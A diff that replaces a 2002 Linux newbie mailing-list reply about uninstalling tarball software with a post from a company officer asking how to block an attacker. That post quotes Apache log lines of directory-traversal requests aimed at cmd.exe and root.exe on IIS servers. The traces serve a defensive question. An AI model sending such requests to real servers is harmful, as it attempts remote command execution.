@@ -1,40 +1,63 @@
-From: Richard Adams <pa3gcu@zeelandnet.nl>
-Subject: Re: Uninstalling
-Date: Thu, 20 Jun 2002 15:55:35 +0000
+From: "Phillp Morgan" <pmorgan@quickpages.net.au>
+Subject: Blocking hackers
+Date: Fri, 21 Jun 2002 13:57:48 +1000
 Sender: linux-newbie-owner@vger.kernel.org
-Message-ID: <02062015553500.05533@unix.pa3gcu>
-References: <200206200807.g5K873v03970@act-naim.iiu.edu.my>
-Reply-To: pa3gcu@zeelandnet.nl
+Message-ID: <004701c218d7$cf274dd0$0c00a8c0@qpbd103>
 Mime-Version: 1.0
-Content-Transfer-Encoding: 7BIT
+Content-Transfer-Encoding: 7bit
 Return-path: <linux-newbie-owner@vger.kernel.org>
-In-Reply-To: <200206200807.g5K873v03970@act-naim.iiu.edu.my>
 List-Id: <linux-newbie.vger.kernel.org>
 Content-Type: text/plain; charset="us-ascii"
-To: azie <azie@kawan.net>, Linux Newbie Mailing List <linux-newbie@vger.kernel.org>
+To: linux-newbie@vger.kernel.org
 
-On Thursday 20 June 2002 08:06, azie wrote:
-> Hi there,
->
-> I've installed a few application using tarballs (e.g apache, modssl,
-> openssl and php). How do I uninstalled these applications? Can I just
-> delete the folders and that's it? Or is there any necessary steps that
-> I have to do to make sure that I've deleted all files connected to that
-> particular applications.
+Hi,
 
-Some (by far not all) tar archies have a makefile included which supports
-'make uninstall' you can try typing make uninstall in the program directory 
-source.
-You can of course delete any directorys created by an install of the program 
-and delete the program itself with "rm /path/name", you can locate the 
-executeable and man pages (if installed) with 'whereis program'
+It looks like someone is trying to break into my system. This is out of my
+apache error log...
 
-> Thank you for your help
+>61.243.140.78 - - [21/Jun/2002:13:58:29 +1000] "GET /MSADC/root.exe?/c+dir
+HTTP/1.0" 404 -
+>61.243.140.78 - - [21/Jun/2002:13:58:30 +1000] "GET
+/c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 -
+>61.243.140.78 - - [21/Jun/2002:13:58:31 +1000] "GET
+/d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 -
+>61.243.140.78 - - [21/Jun/2002:13:58:32 +1000] "GET
+/scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 -
+>61.243.140.78 - - [21/Jun/2002:13:58:33 +1000] "GET
+/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+di
+r HTTP/1.0" 404 -
+>61.243.140.78 - - [21/Jun/2002:13:58:34 +1000] "GET
+/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+di
+r HTTP/1.0" 404 -
+>61.243.140.78 - - [21/Jun/2002:13:58:36 +1000] "GET
+/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../
+winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 -
+>61.243.140.78 - - [21/Jun/2002:13:58:29 +1000] "GET /MSADC/root.exe?/c+dir
+HTTP/1.0" 404 -
+>61.243.140.78 - - [21/Jun/2002:13:58:30 +1000] "GET
+/c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 -
+>61.243.140.78 - - [21/Jun/2002:13:58:31 +1000] "GET
+/d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 -
+>61.243.140.78 - - [21/Jun/2002:13:58:32 +1000] "GET
+/scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 -
+>61.243.140.78 - - [21/Jun/2002:13:58:33 +1000] "GET
+/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir
+HTTP/1.0" 404 -
 
--- 
-Regards Richard
-pa3gcu@zeelandnet.nl
-http://people.zeelandnet.nl/pa3gcu/
+Is there any way I can block this nasty person?
+
+Who should I report this to?
+
+Regards,
+
+Phillip Morgan
+Chief Information Offier
+Quickpages Business Directories
+----------------------------------------------------------------------------
+------------
+This email is intended for the above named recipient only, and may contain
+priveledged information. If you are not the intended recipient please delete
+this email immediately and notify Quickpages of the problem.
 
 -
 To unsubscribe from this list: send the line "unsubscribe linux-newbie" in
